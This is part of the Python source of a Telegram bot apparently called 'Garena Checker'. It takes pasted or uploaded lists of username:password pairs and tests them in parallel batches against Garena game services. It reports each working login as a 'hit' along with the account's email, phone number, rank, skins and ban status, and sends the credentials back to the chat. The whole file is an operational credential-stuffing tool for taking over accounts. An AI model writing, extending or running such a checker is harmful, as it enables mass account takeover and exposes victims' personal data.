                        if str(data.get("result", "")).lower() in ["hit", "true", "success", "valid", "live"]:
                            is_hit = True
                        if data.get("data") and isinstance(data.get("data"), (dict, list, str)):
                            is_hit = True
                        
                        info_fields = ["uid", "id", "name", "nickname", "email", "phone", "sdt", "shells", 
                                      "aov_name", "aov_rank", "aov_level", "aov_total_skins", "aov_total_champs",
                                      "fc_name", "fc_ovr", "garena_created", "last_login", "region"]
                        for field in info_fields:
                            if field in data and data[field] not in [None, "", "N/A"]:
                                is_hit = True
                                break
                        
                        data["result"] = "hit" if is_hit else "dead"
                        with cache_lock:
                            cache_results[cache_key] = data
                        return data
                except:
                    pass
            time.sleep(2)
        except:
            time.sleep(3)
    
    result = {"result": "error"}
    with cache_lock:
        cache_results[cache_key] = result
    return result

# ========== FORMAT HIT ==========
def format_hit_info(username, password, service, data):
    line = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
    desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    
    msg = f"{line}\n{icon} <b>HIT - {desc}</b>\n{line}\n"
    msg += f"🔑 <b>Account:</b> <code>{username}:{password}</code>\n"
    
    field_map = {
        "uid": "🆔 UID",
        "id": "🆔 ID",
        "name": "👤 Name",
        "nickname": "👤 Nickname",
        "email": "📧 Email",
        "phone": "📱 Phone",
        "sdt": "📱 SĐT",
        "fb": "📘 Facebook",
        "region": "🌍 Region",
        "shells": "💰 Shells",
        "nap_so": "💎 Nạp số",
        "level": "📊 Level",
        "rank": "🏆 Rank",
        "aov_name": "🔥 Tên LQ",
        "aov_rank": "👑 Rank LQ",
        "aov_level": "✨ Level LQ",
        "aov_total_skins": "💎 Skin LQ",
        "aov_total_champs": "💪 Tướng LQ",
        "aov_qh": "❤️ QH LQ",
        "aov_ss": "⭐ SS LQ",
        "aov_sss": "🔥 SSS LQ",
        "aov_anime": "🎌 Anime LQ",
        "fc_name": "⚽ Tên FC",
        "fc_ovr": "📊 OVR FC",
        "garena_created": "📅 Tạo GR",
        "last_login": "⏰ Login cuối",
        "tinh_trang": "📋 Tình Trạng",
        "ngay_tao_tk": "📅 Ngày tạo",
        "email_verified": "📩 EMAIL",
        "mobile_bound": "📱 SĐT",
        "password_set": "🛡 PASS",
        "banned": "🚫 BAND",
        "ban_until": "🚫 BAND Den"
    }
    
    info_lines = []
    for key, label in field_map.items():
        if key in data:
            value = data[key]
            if should_skip_field(value):
                continue
            if isinstance(value, bool):
                value = "✅ Có" if value else "❌ Không"
            if isinstance(value, str):
                value = fix_encoding(value)
            info_lines.append(f"{label}: {value}")
    
    list_fields = [
        ("aov_ss_list", "✨ SS List"),
        ("aov_sss_list", "🔥 SSS List"),
        ("aov_anime_list", "🎌 Anime List"),
        ("aov_other_list", "🎲 Other List")
    ]
    
    for field, label in list_fields:
        if field in data and isinstance(data[field], list) and data[field]:
            items = [fix_encoding(str(i)) for i in data[field] if i]
            if items:
                info_lines.append(f"\n{label}:")
                for item in items[:30]:
                    info_lines.append(f"  • {item}")
                if len(items) > 30:
                    info_lines.append(f"  ... +{len(items)-30} items")
    
    if info_lines:
        msg += "\n" + "\n".join(info_lines)
    
    msg += f"\n\n{line}"
    return msg

# ========== CHECK FUNCTIONS ==========
def check_single(chat_id, username, password, service="lienquan"):
    result = check_account_api(username, password, service, use_delay=False)
    result_type = result.get("result", "unknown")
    
    if result_type == "banned":
        safe_send_message(chat_id, f"🚫 <b>BANNED</b>\n🔑 <code>{username}:{password}</code>")
        update_stats(banned_count=1, service=service)
    elif result_type == "hit":
        safe_send_message(chat_id, format_hit_info(username, password, service, result))
        update_stats(hit_count=1, hit_details=[{"user": username, "pwd": password, "service": service, "time": datetime.now().isoformat()}], service=service)
    elif result_type == "dead":
        safe_send_message(chat_id, f"❌ <b>DEAD - {SERVICE_ROUTES.get(service, {}).get('desc', service)}</b>\n🔑 <code>{username}:{password}</code>")
        update_stats(dead_count=1, service=service)
    else:
        safe_send_message(chat_id, f"⚠️ <b>ERROR - {SERVICE_ROUTES.get(service, {}).get('desc', service)}</b>\n🔑 <code>{username}:{password}</code>")
        update_stats(error_count=1, service=service)

def check_batch(chat_id, accounts, service):
    global checking, stats
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    
    checking = True
    stop_event.clear()
    total = len(accounts)
    stats = {"total": total, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "banned": 0, "start_time": time.time()}
    hit_details = []
    
    safe_send_message(chat_id, f"📊 Check {total} accounts...")
    
    batches = [accounts[i:i+CHECKMULTI_BATCH_SIZE] for i in range(0, total, CHECKMULTI_BATCH_SIZE)]
    
    for batch_num, batch in enumerate(batches, 1):
        if stop_event.is_set():
            break
        
        def process(user, pwd):
            if stop_event.is_set():
                return
            rate_limit(CHECKMULTI_DELAY)
            result = check_account_api(user, pwd, service, use_delay=False)
            with stats_lock:
                stats["checked"] += 1
                if result.get("result") == "banned":
                    stats["banned"] += 1
                elif result.get("result") == "hit":
                    stats["hits"] += 1
                    hit_details.append({"user": user, "pwd": pwd, "service": service, "time": datetime.now().isoformat()})
                    safe_send_message(chat_id, format_hit_info(user, pwd, service, result))
                elif result.get("result") == "dead":
                    stats["dead"] += 1
                else:
                    stats["errors"] += 1
        
        with ThreadPoolExecutor(max_workers=CHECKMULTI_THREADS) as executor:
            futures = {executor.submit(process, u, p): (u, p) for u, p in batch}
            for future in as_completed(futures):
                if stop_event.is_set():
                    executor.shutdown(wait=False)
                    break
        
        if batch_num < len(batches):
            time.sleep(CHECKMULTI_BATCH_DELAY)
    
    checking = False
    elapsed = time.time() - stats["start_time"]
    update_stats(hit_count=stats["hits"], dead_count=stats["dead"], error_count=stats["errors"], 
                 banned_count=stats["banned"], accounts=accounts, hit_details=hit_details, service=service)
    
    safe_send_message(chat_id, f"✅ CHECK HOAN TAT!\n━━━━━━━━━━━━━━━━\n📊 Tong: {stats['total']}\n🎯 HIT: {stats['hits']}\n❌ DEAD: {stats['dead']}\n🚫 BANNED: {stats['banned']}\n⚠️ ERROR: {stats['errors']}\n⏱ {elapsed:.1f}s")

def check_all_services(chat_id, accounts):
    global checking
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    if not accounts:
        safe_send_message(chat_id, "❌ Khong co accounts!")
        return
    
    checking = True
    stop_event.clear()
    stats_all = {"total": len(accounts) * len(SERVICE_ROUTES), "checked": 0, "hits": 0, "dead": 0, "errors": 0, "banned": 0, "start_time": time.time()}
    hit_details = []
    
    safe_send_message(chat_id, f"📊 Check all {len(accounts)} accounts...")
    
    batches = [accounts[i:i+CHECKMULTI_BATCH_SIZE] for i in range(0, len(accounts), CHECKMULTI_BATCH_SIZE)]
    
    for batch_num, batch_accounts in enumerate(batches, 1):
        if stop_event.is_set():
            break
        
        tasks = [(u, p, s) for u, p in batch_accounts for s in SERVICE_ROUTES.keys()]
        
        def process(user, pwd, service):
            if stop_event.is_set():
                return
            rate_limit(DEFAULT_DELAY)
            result = check_account_api(user, pwd, service, use_delay=False)
            with stats_lock:
                stats_all["checked"] += 1
                if result.get("result") == "banned":
                    stats_all["banned"] += 1
                elif result.get("result") == "hit":
                    stats_all["hits"] += 1
                    hit_details.append({"user": user, "pwd": pwd, "service": service, "time": datetime.now().isoformat()})
                    safe_send_message(chat_id, format_hit_info(user, pwd, service, result))
                elif result.get("result") == "dead":
                    stats_all["dead"] += 1
                else:
                    stats_all["errors"] += 1
        
        with ThreadPoolExecutor(max_workers=DEFAULT_THREADS) as executor:
            futures = {executor.submit(process, u, p, s): (u, p, s) for u, p, s in tasks}
            for future in as_completed(futures):
                if stop_event.is_set():
                    executor.shutdown(wait=False)
                    break
        
        if batch_num < len(batches):
            time.sleep(CHECKMULTI_BATCH_DELAY)
    
    checking = False
    elapsed = time.time() - stats_all["start_time"]
    update_stats(hit_count=stats_all["hits"], dead_count=stats_all["dead"], error_count=stats_all["errors"],
                 banned_count=stats_all["banned"], accounts=accounts, hit_details=hit_details, service="fullpack")
    
    safe_send_message(chat_id, f"✅ CHECK ALL HOAN TAT!\n━━━━━━━━━━━━━━━━\n🎯 HIT: {stats_all['hits']}\n❌ DEAD: {stats_all['dead']}\n🚫 BANNED: {stats_all['banned']}\n⚠️ ERRORS: {stats_all['errors']}\n⏱ {elapsed:.1f}s")

# ========== BOT COMMANDS ==========
@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not check_membership(message):
        return
    safe_send_message(message.chat.id, f"""
🤖 <b>GARENA CHECKER  - PROFESSIONAL</b>
👤 Admin: @baohuyno1

📌 <b>LENH:</b>
/check user:pass - Check 1 acc
/checkmulti user1:pass1,user2:pass2 - Check nhieu
/checkall - Check tat ca service
/services - Danh sach service
/stop - Dung check


""")

@bot.message_handler(commands=['check'])
def cmd_check(message):
    if not check_membership(message):
        return
    parts = message.text.split()
    if len(parts) < 2:
        safe_send_message(message.chat.id, "❌ /check user:pass")
        return
    service = parts[2] if len(parts) > 2 else "lienquan"
    if service not in SERVICE_ROUTES:
        safe_send_message(message.chat.id, f"❌ Service: {', '.join(SERVICE_ROUTES.keys())}")
        return
    accounts, _ = loc_tk_mk_only(parts[1].replace('|', ':'))
    if not accounts:
        safe_send_message(message.chat.id, "❌ Format sai! Dung: user:pass")
        return
    threading.Thread(target=check_single, args=(message.chat.id, accounts[0][0], accounts[0][1], service)).start()

@bot.message_handler(commands=['checkmulti'])
def cmd_checkmulti(message):
    if not check_membership(message):
        return
    text = message.text.strip()
    if text.startswith('/checkmulti'):
        text = text[len('/checkmulti'):].strip()
    if not text:
        safe_send_message(message.chat.id, "❌ /checkmulti user1:pass1\\nuser2:pass2")
        return
    
    lines = text.split('\n')
    service = "lienquan"
    if lines:
        last = lines[-1].strip()
        last_word = last.split()[-1] if last.split() else ""
        if last_word in SERVICE_ROUTES:
            service = last_word
            lines = lines[:-1] if len(last.split()) == 1 else [last.rsplit(last_word, 1)[0].strip()] + lines[:-1]
    
    accounts, _ = loc_tk_mk_only('\n'.join(lines).replace(',', '\n').replace('|', ':'))
    if not accounts:
        safe_send_message(message.chat.id, "❌ Khong tim thay acc!")
        return
    safe_send_message(message.chat.id, f"📊 Check {len(accounts)} accounts...")
    threading.Thread(target=check_batch, args=(message.chat.id, accounts, service)).start()

@bot.message_handler(commands=['checkall'])
def cmd_checkall(message):
    if not check_membership(message):
        return
    chat_id = message.chat.id
    if chat_id in pending_accounts and pending_accounts[chat_id]:
        accounts = pending_accounts[chat_id]
        pending_accounts[chat_id] = []
        threading.Thread(target=check_all_services, args=(chat_id, accounts)).start()
    else:
        safe_send_message(chat_id, "❌ Khong co acc nao dang cho!")

@bot.message_handler(commands=['services'])
def cmd_services(message):
    if not check_membership(message):
        return
    msg = "📋 <b>SERVICE:</b>\n\n"
    for key, value in SERVICE_ROUTES.items():
        msg += f"{value['icon']} <b>{key}</b>: {value['desc']}\n"
    safe_send_message(message.chat.id, msg)

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if not check_membership(message):
        return
    stop_event.set()
    global checking
    checking = False
    safe_send_message(message.chat.id, "🛑 Da dung check!")

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not check_membership(message):
        return
    text = message.text.strip()
    if text.startswith('/'):
        return
    accounts, _ = loc_tk_mk_only(text.replace('|', ':'))
    if not accounts:
        return
    chat_id = message.chat.id
    if chat_id not in pending_accounts:
        pending_accounts[chat_id] = []
    pending_accounts[chat_id] = accounts
    save_loc_file(accounts)
    preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
    safe_send_message(chat_id, f"📊 LOC {len(accounts)} ACCOUNTS\nPreview:\n{preview}\n👇 /checkall - Check tat ca")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not check_membership(message):
        return
    chat_id = message.chat.id
    try:
        if not message.document.file_name.endswith('.txt'):
            safe_send_message(chat_id, "❌ Chi ho tro file .txt!")
            return
        content = bot.download_file(bot.get_file(message.document.file_id).file_path).decode('utf-8', errors='ignore')
        accounts, _ = loc_tk_mk_only(content.replace('|', ':'))
        if not accounts:
            safe_send_message(chat_id, "❌ Khong tim thay user:pass!")
            return
        if chat_id not in pending_accounts:
            pending_accounts[chat_id] = []
        pending_accounts[chat_id] = accounts
        save_loc_file(accounts)
        preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:20]])
        safe_send_message(chat_id, f"✅ LOC {len(accounts)} ACCOUNTS\nPreview:\n{preview}\n👇 /checkall - Check tat ca")
    except Exception as e:
        safe_send_message(chat_id, f"❌ Loi: {e}")

def main():
    print("=" * 60)
    print("    GARENA CHECKER V8.5 - PROFESSIONAL SYSTEM")
    print("    ADMIN: @baohuyno1")
    print("    ===== WEB DASHBOARD + CHART.JS ===== ")
    print("    ===== HIT FORMAT CHUYEN NGHIEP ===== ")
    print("    ===== THONG KE SERVICE + USER ===== ")
    print("=" * 60)
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except Exception as e:
            print(f"[!] Loi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot dung!")
        sys.exit(0)
